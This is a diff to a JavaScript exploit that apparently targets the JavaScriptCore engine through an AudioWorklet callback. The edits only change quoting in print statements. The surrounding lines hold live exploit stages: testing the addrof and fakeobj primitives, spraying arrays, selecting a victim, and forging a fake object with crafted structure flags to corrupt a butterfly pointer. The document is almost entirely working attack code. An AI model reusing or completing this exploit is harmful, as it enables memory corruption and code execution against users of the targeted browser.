@@ -971,7 +971,7 @@ b.process = (inputs, outputs, parameters)=>{
          // verify basic exploit primitives work.
     var addr = addrof({p: 0x1337});
     if(fakeobj(addr).p == 0x1337) {
-    print1('[+] exploit primitives working');
+    print1("[+] exploit primitives working");
     }
 
 
@@ -991,14 +991,14 @@ b.process = (inputs, outputs, parameters)=>{
     for (var i = 0; i < 0x1000; ++i) {
         var array = [13.37];
         array.pointer = 1234;
-        array['prop' + i] = 13.37;
+        array["prop" + i] = 13.37;
         structs.push(array);
     }
 
     // take an array from somewhere in the middle so it is preceeded by non-null bytes which
     // will later be treated as the butterfly length.
     var victim = structs[0x800];
-    print1(`[+] victim @ ${addrof(victim)}`);
+    print1("[+] victim @" + addrof(victim));
 
     // craft a fake object to modify victim
     var flags_double_array = new Int64("0x0108200700001000").asJSValue();
@@ -1009,7 +1009,7 @@ b.process = (inputs, outputs, parameters)=>{
 
     // create object having |victim| as butterfly.
     var containerAddr = addrof(container);
-    print1(`[+] container @ ${containerAddr}`);
+    print1("[+] container @"+containerAddr);
     // add the offset to let compiler recognize fake structure
     var hax = fakeobj(Add(containerAddr, 0x10));
     // origButterfly is now based on the offset of **victim** 
